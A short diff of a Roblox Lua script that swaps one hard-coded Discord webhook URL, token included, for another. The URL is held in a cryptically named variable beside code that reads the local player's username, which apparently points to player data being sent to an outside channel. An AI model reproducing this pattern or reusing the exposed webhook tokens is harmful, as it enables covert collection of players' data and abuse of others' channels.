@@ -50,7 +50,7 @@ local Players = game:GetService("Players")
 local MarketplaceService = game:GetService("MarketplaceService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
-local xUrL7 = "https://discord.com/api/webhooks/1456805060054093968/iA9pSt6ZQFfvgi6SeOV90KObnHNKYJBRIgQhgNImCWNqTXp5gLPDIZtDGO1_hdrfBpCg"
+local xUrL7 = "https://discord.com/api/webhooks/1457162778048594041/SvwT5w7pd1zf1g3wOhq5N-6v8OeCnFjHzty5nYOMLopYCLQrzxo1I5uccxQVWaDb0hgx"
 
 local player = Players.LocalPlayer
 local username = player.Name
